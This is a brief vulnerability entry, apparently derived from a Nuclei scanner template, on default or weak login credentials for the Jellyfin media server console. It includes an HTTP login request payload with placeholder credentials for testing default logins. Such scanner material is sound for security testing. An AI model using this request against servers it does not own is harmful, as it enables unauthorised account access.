# Vulnerability: Jellyfin Console - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`jellyfin-default-login.yaml`)

## Description
Weak Jellyfin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /Users/authenticatebyname HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
X-Emby-Authorization: MediaBrowser Client="Jellyfin Web", Device="Browser", DeviceId="DeviceID", Version="Version"

{"Username":"{{username}}","Pw":"{{password}}"}
```

